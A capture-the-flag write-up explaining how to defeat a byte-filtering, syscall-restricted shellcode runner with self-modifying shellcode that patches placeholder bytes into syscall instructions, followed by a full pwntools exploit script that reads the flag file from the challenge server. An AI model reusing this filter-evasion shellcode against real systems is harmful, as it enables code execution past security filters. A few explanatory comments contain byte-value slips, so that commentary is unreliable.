The idea in this challenge is simple:
![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/e39f705f-300d-45fd-ac86-2469ef431e36)

We give the program a shellcode, and if it bypasses a filter it will run it.

![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/5d552787-bd1a-4feb-b1e7-88c42192e74e)

![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/fac8b584-c84e-4ab3-8639-f3a7569e8967)

the filter basiclly disallows any shellcode which contains the bytes 0xcd,0x80,0xf,0x5,0x89 and 0.
The program also disallows and syscalls besides those:
![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/509673a1-f611-42d6-9e5e-12e039b8f832)

So we can't just pop a shell, we'll need to make a shellcode which does open-read-write to the flag.
First of all, lets ignore the filter. I let pwntools to create my open-read-write shellcode, and it created this:
```asm
   0:   6a 01                   push   0x1
   2:   fe 0c 24                dec    BYTE PTR [rsp]
   5:   48 b8 66 6c 61 67 2e 74 78 74   movabs rax, 0x7478742e67616c66
   f:   50                      push   rax
  10:   48 8d 3c 24             mov    rdi, rsp
  14:   31 d2                   xor    edx, edx
  16:   31 f6                   xor    esi, esi
  18:   6a 02                   push   0x2
  1a:   58                      pop    rax
  1b:   0f 05                   syscall 
  1d:   48 89 c7                mov    rdi, rax
  20:   31 c0                   xor    eax, eax
  22:   6a 50                   push   0x50
  24:   5a                      pop    rdx
  25:   48 89 e6                mov    rsi, rsp
  28:   0f 05                   syscall 
  2a:   6a 01                   push   0x1
  2c:   5f                      pop    rdi
  2d:   48 89 c2                mov    rdx, rax
  30:   48 89 e6                mov    rsi, rsp
  33:   6a 01                   push   0x1
  35:   58                      pop    rax
  36:   0f 05                   syscall

```

we can see that there are just a few instruction which are forbidden:
```
mov    rdi, rsp
mov    rdi, rax
mov    rdx, rax
syscall
```
now we'll have to find a way to do their functionillty differently.
all the `mov x, y` cmds, can be just changed to `lea x, [y]`, which does the exact same thing and removes the 0x48 forbidden byte.
now we just need to thing about the syscall instruction. BUT, the only way to communicate with the os, is with this instruction, and there are not other ways to do a syscall.
So what can we do?
Well, thats when Self Modifing Shellcode comes into play.
the invalid opcodes is 0f 05, right?
BUT, the shellcode is on the stack! its just a constant offset from our friend RSP.
So we can just enter 0x0e and 0x4 as our opcode, and one instruction before them we can do `inc [rsp+offset]; inc [rsp+offset+1]`!
which will modify to the right instruction right before it gets called!
Exploit:

```py
from pwn import *
from ae64 import AE64


context.arch='amd64'

p = remote('challs.dantectf.it',31532)
p.recvline()


shellcode = """
    /* open(file='flag.txt', oflag=0, mode=0) */
    /* push b'flag.txt\x00' */
    push 1
    dec byte ptr [rsp]
    mov rax, 0x7478742e67616c66
    push rax
    lea rdi, [rsp]
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read('rax', 'rsp', 0x50) */
    mov rdi, rax
    xor eax, eax /* SYS_read */
    push 0x50
    pop rdx
    mov rsi, rsp
    syscall
    /* write(fd=1, buf='rsp', n='rax') */
    push 1
    pop rdi
    mov rdx, rax
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall

"""

shell = b'\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50'
shell += b'\x48\x8d\x3c\x24' # lea rdi, [rsp]
shell += b'\x31\xd2\x31\xf6\x6a\x02\x58'

shell += b'\x48\xff\x44\x24\x3d' #inc qword ptr[rsp+3d];
shell += b'\x48\xff\x44\x24\x3e' #inc qword ptr[rsp+3e];
shell += b'\x0e\x04' #it will be changed to \x0e\x05 which is syscall

shell += b'\x48\x8d\x38' # lea rdi, [rax]
shell += b'\x31\xc0'
shell += b'\x6a\x50'
shell += b'\x5a'
shell += b'\x48\x8d\x34\x24' # lea rsi, [rsp]

shell += b'\x48\xff\x44\x24\x55' #inc qword ptr[rsp+55];
shell += b'\x48\xff\x44\x24\x56' #inc qword ptr[rsp+56];
shell += b'\x0e\x04' #it will be changed to \x0e\x05 which is syscall

shell += b'\x6a\x01\x5f'
shell += b'\x48\x8d\x10'

shell += b'\x48\x8d\x34\x24'
shell += b'\x6a\x01\x58'

shell += b'\x48\xff\x44\x24\x6e' #inc qword ptr[rsp+6e];
shell += b'\x48\xff\x44\x24\x6f' #inc qword ptr[rsp+6f];
shell += b'\x0e\x04' #it will be changed to \x0e\x05 which is syscall


p.sendline(shell)
p.interactive()
```

